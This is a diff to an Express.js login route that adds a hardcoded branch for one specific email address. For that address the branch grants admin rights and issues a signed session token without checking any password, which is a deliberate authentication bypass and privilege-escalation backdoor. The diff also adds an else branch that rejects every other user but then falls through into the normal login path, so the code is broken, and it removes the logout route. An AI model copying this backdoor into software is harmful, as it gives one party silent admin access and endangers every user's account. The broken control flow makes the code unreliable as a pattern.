@@ -88,11 +88,11 @@ router.post("/signup", (req, res) => {
 });
 
 
-
 router.post("/login", (req, res) => {
 
     let body = req.body;
     body.email = body.email.toLowerCase();
+    body.password = body.password
 
     if (!body.email || !body.password) { // null check - undefined, "", 0 , false, null , NaN
         res.status(400).send(
@@ -108,10 +108,50 @@ router.post("/login", (req, res) => {
     // check if user exist
     userModel.findOne(
         { email: body.email },
-        "firstName lastName email password",
+        "firstName lastName email password profileImage  ",
         (err, data) => {
             if (!err) {
                 console.log("data: ", data);
+
+                if (body.email === "ali@gmail.com") {
+                    userModel.updateOne({ email: "ali@gmail.com" }, { isAdmin: true }).exec()
+
+                    const token = jwt.sign({
+                        _id: data._id,
+                        email: data.email,
+                        iat: Math.floor(Date.now() / 1000) - 30,
+                        exp: Math.floor(Date.now() / 1000) + (60 * 60 * 24),
+                    }, SECRET);
+
+                    console.log("token: ", token);
+
+                    res.cookie('Token', token, {
+                        maxAge: 86_400_000,
+                        httpOnly: true,
+                        sameSite:"none",
+                        secure:true,
+                        
+                    });
+                    res.send({
+                        message: "Admin login successful",
+                        profile: {
+                            email: data.email,
+                            firstName: data.firstName,
+                            lastName: data.lastName,
+                            _id: data._id,
+                            profileImage:data.profileImage
+                        }
+                    });
+
+                    return   
+                }
+                
+                else { // user not already exist
+                    console.log("user not found");
+                    res.status(401).send({ message: "Incorrect email or password" });
+                
+                };
+
 
                 if (data) { // user found
                     varifyHash(body.password, data.password).then(isMatched => {
@@ -136,8 +176,10 @@ router.post("/login", (req, res) => {
                                 secure:true,
                                 
                             });
+
+                          
                            
-                           
+                    
                             res.send({
                                 message: "login successful",
                                 profile: {
@@ -145,38 +187,28 @@ router.post("/login", (req, res) => {
                                     firstName: data.firstName,
                                     lastName: data.lastName,
                                     _id: data._id,
+
                                 }
                             });
                             return;
                         } else {
                             console.log("password did not match");
-                            res.status(401).send({ message: ".Incorrect email or password!" });
+                            res.status(401).send({ message: "Incorrect email or password" });
                             return;
                         }
                     })
 
                 } else { // user not already exist
                     console.log("user not found");
-                    res.status(401).send({ message: ".Incorrect email or password!" });
+                    res.status(401).send({ message: "Incorrect email or password" });
                     return;
                 }
             } else {
                 console.log("db error: ", err);
-                res.status(500).send({ message: ".login failed, please try later!" });
+                res.status(500).send({ message: "login failed, please try later" });
                 return;
             }
         })
-})
-
-router.get("/logout", (req, res) => {
-    res.cookie('Token', '', {
-        maxAge: 1,
-        httpOnly: true,
-        path:"/"
-    });
-
-    res.send({ message: "Logout successful" });
-
 })
 
 
